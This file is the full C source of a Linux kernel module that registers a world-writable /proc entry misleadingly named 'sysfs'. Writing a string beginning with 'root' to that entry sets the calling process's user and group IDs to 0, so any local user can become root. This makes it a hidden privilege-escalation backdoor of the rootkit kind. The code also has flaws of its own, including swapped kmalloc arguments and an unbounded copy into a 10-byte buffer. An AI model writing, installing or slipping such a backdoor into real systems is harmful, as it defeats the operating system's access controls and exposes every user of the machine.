#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/proc_fs.h>
#include <linux/sched.h>
#include <asm/uaccess.h>
#include <linux/slab.h>
#include <linux/cred.h>
int len,temp;

char *msg;

#define PROCENTRY "sysfs"
static ssize_t read_proc(struct file *filp,char *buf,size_t count,loff_t *offp) {
    int retval;
    if(count>temp) {
        count=temp;
    }
    temp=temp-count;
    retval = copy_to_user(buf,msg, count);
    if (retval < 0) {
        return 0;
    }
    if(count==0)
        temp=len;
    return count;
}

static ssize_t write_proc(struct file *filp,const char *buf,size_t count,loff_t *offp) {
    struct cred * cred;
    int retval;
    retval = copy_from_user(msg,buf,count);
    if (retval < 0) {
        return 0;
    }
    if (strncmp(buf,"root", 4) == 0) {
        cred = (struct cred * )__task_cred(current);
#ifdef CENTOS7
        cred-> uid.val = 0;
        cred-> gid.val = 0;
        cred-> suid.val = 0;
        cred-> euid.val = 0;
        cred-> egid.val = 0;
        cred-> fsuid.val = 0;
        cred-> fsgid.val = 0;
#else
        cred-> uid = 0;
        cred-> gid = 0;
        cred-> suid = 0;
        cred-> euid = 0;
        cred-> egid = 0;
        cred-> fsuid = 0;
        cred-> fsgid = 0;
#endif
#ifdef DEBUG
        printk("now you are root\n");
#endif
    }
    len=count;
    temp=len;
    return count;
}

struct file_operations proc_fops = {
    read: read_proc,
    write: write_proc
};
void create_new_proc_entry(void) {
    proc_create(PROCENTRY, S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP | S_IROTH | S_IWOTH, NULL, &proc_fops);
    msg = kmalloc(GFP_KERNEL, 10 * sizeof(char));
}


int proc_init (void) {
    create_new_proc_entry();
    return 0;
}

void proc_cleanup(void) {
    remove_proc_entry(PROCENTRY, NULL);
}

MODULE_LICENSE("GPL");
module_init(proc_init);
module_exit(proc_cleanup);
